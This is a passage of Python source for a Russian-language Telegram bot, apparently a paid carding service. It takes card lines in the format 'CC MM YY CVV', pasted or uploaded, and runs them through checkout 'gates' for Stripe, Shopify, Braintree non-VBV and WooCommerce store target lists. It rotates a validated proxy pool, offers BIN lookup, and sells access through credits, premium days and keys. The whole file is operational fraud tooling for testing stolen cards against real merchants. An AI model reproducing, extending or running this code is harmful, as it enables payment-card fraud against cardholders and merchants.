@user_only
async def addcredits(client, message: Message):
    p = (message.text or "").split()
    if len(p) != 3 or not p[1].lstrip("-").isdigit() or not p[2].lstrip("-").isdigit():
        return await message.reply("Формат: /addcredits UID N")
    # db.admin_add_credits: соединение гарантированно закрывается (_db())
    if not db.admin_add_credits(int(p[1]), int(p[2])):
        return await message.reply(f"UID {p[1]} не найден")
    await message.reply(f"Готово: UID {p[1]} кредиты {int(p[2]):+d}")


@app.on_message(filters.command(["addpremium"]))
@admin_only
@user_only
async def addpremium(client, message: Message):
    p = (message.text or "").split()
    if len(p) != 3 or not p[2].isdigit():
        return await message.reply("Формат: /addpremium UID ДНИ")
    uid, days = int(p[1]), int(p[2])
    # db.admin_add_premium: соединение гарантированно закрывается (_db())
    if not db.admin_add_premium(uid, days):
        return await message.reply(f"UID {uid} не найден")
    await message.reply(f"Готово: UID {uid} премиум +{days} дн.")


@app.on_message(filters.command(["genkey"]))
@admin_only
@user_only
async def genkey(client, message: Message):
    """Формат: /genkey КРЕДИТЫ или /genkey 0 ДНИ — ключ одноразовый."""
    p = (message.text or "").split()
    credits = int(p[1]) if len(p) > 1 and p[1].isdigit() else 0
    days = int(p[2]) if len(p) > 2 and p[2].isdigit() else 0
    key = _secrets.token_hex(8)
    db.add_key(key, days=days, credits=credits)
    await message.reply(f"Ключ: <code>{key}</code> ({credits} кр. / {days} дн.)",
                        parse_mode=ParseMode.HTML)


# --- Интерактивные callback-кнопки ---

@app.on_callback_query()
@user_only
async def callback_router(client, callback_query: CallbackQuery):
    u_id = callback_query.from_user.id
    db.ensure_user(u_id, callback_query.from_user.username or "")
    data = callback_query.data or ""
    u = db.get_user(u_id)
    settings = db.get_user_settings(u_id)
    is_admin = db.is_developer(u)

    try:
        if data == "menu:main":
            text = render_main_menu(u, settings)
            kb = keyboards.main_menu_kb(settings["selected_gate"], settings["selected_tier"], is_admin=is_admin)
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data == "menu:prices":
            text = render_prices_menu(settings)
            kb = keyboards.prices_menu_kb(settings["selected_tier"], settings["selected_gate"])
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data.startswith("tier:set:"):
            tier = data.split("tier:set:")[1]
            db.set_user_tier(u_id, tier)
            settings["selected_tier"] = tier
            text = render_prices_menu(settings)
            kb = keyboards.prices_menu_kb(settings["selected_tier"], settings["selected_gate"])
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            t_disp = keyboards.get_tier_display(tier)
            await callback_query.answer(f"✓ Выбран ценовой тир: {t_disp}")

        elif data == "menu:gates":
            text = render_gates_menu(settings)
            kb = keyboards.gates_menu_kb(settings["selected_gate"])
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data.startswith("gate:set:"):
            gate = data.split("gate:set:")[1]
            db.set_user_gate(u_id, gate)
            settings["selected_gate"] = gate
            text = render_gates_menu(settings)
            kb = keyboards.gates_menu_kb(settings["selected_gate"])
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            g_disp = keyboards.get_gate_display(gate)
            await callback_query.answer(f"✓ Выбран шлюз: {g_disp}")

        elif data == "menu:prompt_check":
            text = render_prompt_check(settings)
            kb = keyboards.check_prompt_kb(settings["selected_gate"], settings["selected_tier"])
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data == "menu:profile":
            text = render_profile(u, settings)
            kb = keyboards.profile_kb()
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data == "menu:gates_monitor":
            text = render_gates_monitor()
            kb = keyboards.gates_monitor_kb()
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data == "menu:proxy":
            text = render_proxy_status()
            kb = keyboards.proxy_kb(is_admin=is_admin)
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data == "proxy:check":
            await callback_query.answer("📡 Запуск проверки прокси...", show_alert=False)
            proxies = gc.load_proxies()
            if not proxies:
                await callback_query.edit_message_text(
                    "📡 <b>Прокси-пул:</b> пуст (прямое подключение)\nДобавить: <code>/addproxy host:port</code>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=keyboards.proxy_kb(is_admin=is_admin)
                )
                return

            PROBE_CAP = 500
            checked, skipped = proxies[:PROBE_CAP], proxies[PROBE_CAP:]
            await callback_query.edit_message_text(
                f"📡 Проверяю {len(checked)} прокси — probing ipify...",
                parse_mode=ParseMode.HTML
            )
            from proxy_manager import ProxyPool
            pool = ProxyPool(checked)
            fails_before = {e["url"]: e["fail_count"] for e in pool.entries}
            try:
                alive, _total = await pool.validate_all(concurrency=80)
            except Exception as e:
                return await callback_query.edit_message_text(
                    f"❌ Валидация сорвалась: <code>{html.escape(type(e).__name__)}: {html.escape(str(e)[:120])}</code>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=keyboards.proxy_kb(is_admin=is_admin)
                )

            dead_urls = {e["url"] for e in pool.entries
                         if not e["alive"] or e["fail_count"] > fails_before.get(e["url"], 0)}
            alive_urls = [e["url"] for e in pool.entries if e["url"] not in dead_urls]

            if dead_urls:
                _atomic_write_lines(os.path.join("data", "proxies.txt"), alive_urls + skipped)

            lats = sorted(e["latency_ms"] for e in pool.entries
                          if e["url"] not in dead_urls and e.get("latency_ms"))
            med = lats[len(lats) // 2] if lats else 0
            s5_alive = sum(1 for u in alive_urls if u.startswith("socks5://"))
            s4_alive = sum(1 for u in alive_urls if u.startswith("socks4://"))
            ht_alive = sum(1 for u in alive_urls if u.startswith("http://") or u.startswith("https://"))
            lines = [
                f"📡 <b>Прокси-пул:</b> {len(alive_urls)}/{len(checked)} живых",
                f"• Протоколы: <b>SOCKS5: {s5_alive}</b> | <b>SOCKS4: {s4_alive}</b> | <b>HTTP: {ht_alive}</b>",
                f"• Медиана отклика: <b>{med} ms</b>",
                f"• Не ответили: <b>{len(dead_urls)}</b>" + (" — удалены из пула" if dead_urls else ""),
            ]
            if skipped:
                lines.append(f"• Не проверено (лимит {PROBE_CAP}): <b>{len(skipped)}</b> — остались в пуле")
            lines.append(f"• По пулу (3 страйка): <b>{alive}</b> живых")
            await callback_query.edit_message_text(
                "\n".join(lines),
                parse_mode=ParseMode.HTML,
                reply_markup=keyboards.proxy_kb(is_admin=is_admin)
            )

        elif data == "proxy:clear":
            if not is_admin:
                return await callback_query.answer("Доступно только администраторам", show_alert=True)
            p_path = os.path.join("data", "proxies.txt")
            _atomic_write_lines(p_path, [])
            await callback_query.answer("🧹 Прокси-пул очищен!", show_alert=True)
            text = render_proxy_status()
            await callback_query.edit_message_text(
                text, parse_mode=ParseMode.HTML,
                reply_markup=keyboards.proxy_kb(is_admin=is_admin)
            )

        elif data == "menu:mass":
            text = render_mass_help(settings)
            kb = keyboards.back_to_menu_kb()
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data == "menu:bin":
            text = render_bin_help()
            kb = keyboards.back_to_menu_kb()
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data == "menu:redeem":
            text = render_redeem_help()
            kb = keyboards.back_to_menu_kb()
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data == "menu:help":
            text = render_help_menu()
            kb = keyboards.back_to_menu_kb()
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        elif data == "menu:refresh":
            u = db.get_user(u_id)
            settings = db.get_user_settings(u_id)
            text = render_main_menu(u, settings)
            kb = keyboards.main_menu_kb(settings["selected_gate"], settings["selected_tier"], is_admin=is_admin)
            try:
                await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            except Exception:
                pass
            await callback_query.answer("🔄 Данные обновлены")

        elif data == "menu:admin":
            if not is_admin:
                return await callback_query.answer("Доступно только администраторам", show_alert=True)
            text = render_admin_panel()
            kb = keyboards.admin_kb()
            await callback_query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            await callback_query.answer()

        else:
            await callback_query.answer()

    except Exception as e:
        print(f"[callback error] {type(e).__name__}: {e}")
        try:
            await callback_query.answer(f"Ошибка: {e}"[:60], show_alert=True)
        except Exception:
            pass


# --- Прямой ввод карты без слэш-команд ---

_not_command = filters.create(lambda _, __, m: bool(m.text and not m.text.strip().startswith("/")))

@app.on_message(filters.text & _not_command)
@user_only
async def direct_card_input(client, message: Message):
    text = (message.text or "").strip()
    if not text:
        return

    # 6 цифр в сообщении -> BIN Lookup
    if len(text) == 6 and text.isdigit():
        log.log_tg(f"Direct 6-digit BIN lookup: {text}", user_id=message.from_user.id, username=message.from_user.username)
        return await cmd_bin(client, message)

    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    u = db.get_user(u_id)
    is_admin = bool(u_id in config.ADMIN_IDS or db.is_developer(u))
    cards = parse_cards(text, limit=10000 if is_admin else 25, dedupe=False)
    if not cards:
        return

    settings = db.get_user_settings(u_id)
    selected_gate = settings.get("selected_gate", "chk")
    selected_tier = settings.get("selected_tier", "1")
    tier_arg = None if selected_tier in ("all", "none") else selected_tier

    log.log_tg(f"Direct input: {len(cards)} card(s) -> gate: {selected_gate} (tier: {selected_tier})", user_id=u_id, username=message.from_user.username)

    if len(cards) == 1:
        if selected_gate == "hit":
            return await message.reply(
                "🎯 <b>Шлюз Stripe Direct (/hit):</b>\n"
                "Для проверки по этому шлюзу требуется ссылка чекаута:\n"
                f"<code>/hit https://checkout.stripe.com/c/pay/cs_live_... {text}</code>\n\n"
                "Или смените шлюз на <b>Авто (/chk)</b> или <b>Store API</b> через меню 🎯 <b>Выбор шлюза</b>.",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboards.check_prompt_kb(selected_gate, selected_tier)
            )
        gate_to_run = _pick_gate(None) if selected_gate == "chk" else selected_gate
        if not gate_to_run or gate_to_run not in GATES:
            log.log_router(f"Direct check rejected: no active live gates available")
            return await message.reply("❌ Нет доступных шлюзов с активными целями (проверьте data/ready_gates.json или data/store_targets.txt).")
        return await run_gate(message, gate_to_run, text, tier=tier_arg)
    else:
        # Несколько карт -> запускаем массовый чек через cmd_mass
        return await cmd_mass(client, message)


@app.on_message(filters.document)
@user_only
async def direct_document_input(client, message: Message):
    caption = (message.caption or "").strip()
    if caption.startswith("/"):
        return

    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")

    try:
        doc = await message.download(in_memory=True)
        content = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    except Exception as e:
        log.log_warn(f"Failed to read uploaded document: {e}")
        return

    lines = [l.strip() for l in content.splitlines() if l.strip() and not l.strip().startswith("#")]
    if not lines:
        return await message.reply("⚠️ Загруженный файл пуст.")

    # 1. Сначала определяем прокси-файл (по имени файла или по структуре IP:PORT / SCHEME)
    doc_name = (message.document.file_name or "").lower() if message.document else ""
    is_proxy_named = "proxy" in doc_name or "proxies" in doc_name
    proxy_candidates = [gc.normalize_proxy(l) for l in lines[:30] if gc.normalize_proxy(l)]

    if is_proxy_named or len(proxy_candidates) >= min(len(lines), 3):
        if u_id not in config.ADMIN_IDS:
            return await message.reply("❌ Загрузка прокси доступна только администраторам бота.")
        log.log_tg(f"Direct doc upload: proxy list detected ({len(lines)} lines, name={doc_name}) -> running cmd_addproxy",
                   user_id=u_id, username=message.from_user.username)
        return await cmd_addproxy(client, message)

    # 2. Иначе проверяем, являются ли строки картами (CC MM YY CVV)
    cards = parse_cards(content, limit=5, dedupe=False)
    if cards:
        log.log_tg(f"Direct doc upload: {len(cards)} card(s) detected -> running cmd_mass",
                   user_id=u_id, username=message.from_user.username)
        return await cmd_mass(client, message)

    return await message.reply(
        "❓ <b>Не удалось распознать тип файла:</b>\n\n"
        "• Для добавления <b>прокси</b> отправьте файл со списком <code>ip:port</code> или добавьте слово <i>proxy</i> в имя файла.\n"
        "• Для массового чека <b>карт</b> файл должен содержать строки формата <code>CC MM YY CVV</code>.",
        parse_mode=ParseMode.HTML
    )


if __name__ == "__main__":
    import platform
    session_file = Path(__file__).parent / "pusto_bot.session"
    if not config.BOT_TOKEN and not session_file.exists():
        log.log_error("STARTUP", "set PUSTO_BOT_TOKEN env (from @BotFather) or place session file")
        log.log_info(f"gates loaded: {list(GATES)}")
        sys.exit(1)

    auth = f"token {config.BOT_TOKEN[:8]}..." if config.BOT_TOKEN else f"session {session_file.name}"
    proxies = gc.load_proxies()
    avail = _available_gates()

    from bot.gates.storegate import _targets as _st_targets
    from bot.gates.shopify import _targets as _sp_targets
    from bot.gates.piconfirm import _target as _pi_target
    from bot.gates.braintreenvbv import _targets as _bt_targets

    st_cnt = len(_st_targets())
    sw_cnt = len(setup_gate.load_ready_gates())
    sp_cnt = len(_sp_targets())
    pi_cnt = 1 if _pi_target() else 0
    bt_cnt = len(_bt_targets())

    print("\033[1;36m" + "=" * 78 + "\033[0m")
    print("\033[1;97m" + "  🚀 PUSTO ENGINE — REAL-TIME VERBOSE CONSOLE LOGGER ACTIVE" + "\033[0m")
    print("\033[1;36m" + "=" * 78 + "\033[0m")
    print(f"  \033[90mPython:\033[0m {platform.python_version()} ({sys.executable})")
    print(f"  \033[90mOS / PID:\033[0m {platform.system()} {platform.release()} | PID: {os.getpid()}")
    print(f"  \033[90mAuth Mode:\033[0m {auth}")
    print(f"  \033[90mAdmins:\033[0m {list(config.ADMIN_IDS)}")
    print(f"  \033[90mProxy Pool:\033[0m \033[1;32m{len(proxies)}\033[0m loaded ({config.PROXY_FILE})")
    print(f"  \033[90mRegistered Gates:\033[0m {list(GATES.keys())}")
    print(f"  \033[90mActive Target Pool:\033[0m")
    print(f"    • \033[1;33mstoregate\033[0m:     {st_cnt} targets (data/store_targets.txt)")
    print(f"    • \033[1;33msetupwoo\033[0m:      {sw_cnt} ready gates (data/ready_gates.json)")
    print(f"    • \033[1;33mshopify\033[0m:       {sp_cnt} targets (data/shopify_targets.txt)")
    print(f"    • \033[1;33mpiconfirm\033[0m:     {pi_cnt} targets")
    print(f"    • \033[1;33mbraintreenvbv\033[0m: {bt_cnt} targets")
    print(f"  \033[90mPriority Chain:\033[0m \033[1;36m{' -> '.join(avail) if avail else 'NONE'}\033[0m")
    print("\033[1;36m" + "-" * 78 + "\033[0m")
    print("  \033[1;32m[*] Telegram client polling started. Real-time detailed logs streaming below:\033[0m")
    print("\033[1;36m" + "=" * 78 + "\033[0m")

    async def _runner():
        import proxy_manager
        from pyrogram import idle
        async with app:
            async def _bg_proxy():
                while True:
                    await asyncio.sleep(15 * 60)
                    try:
                        p_list = gc.load_proxies()
                        if p_list:
                            pp = proxy_manager.ProxyPool(p_list)
                            alive, total = await pp.validate_all()
                            alive_urls = [e["url"] for e in pp.entries if e.get("alive") is True]
                            if alive_urls and len(alive_urls) < len(p_list):
                                _atomic_write_lines(config.PROXY_FILE, alive_urls)
                                log.log_proxy("PRUNED", None, f"Pruned {len(p_list) - len(alive_urls)} dead proxies from pool")
                            log.log_proxy("VALIDATE", None, f"{len(alive_urls)}/{len(p_list)} alive (15m auto-refresh)")
                    except asyncio.CancelledError:
                        break
                    except Exception as e:
                        log.log_warn(f"Proxy auto-validation warning: {e}")

            bg_task = asyncio.create_task(_bg_proxy())
            try:
                await idle()
            finally:
                bg_task.cancel()

    app.loop.run_until_complete(_runner())
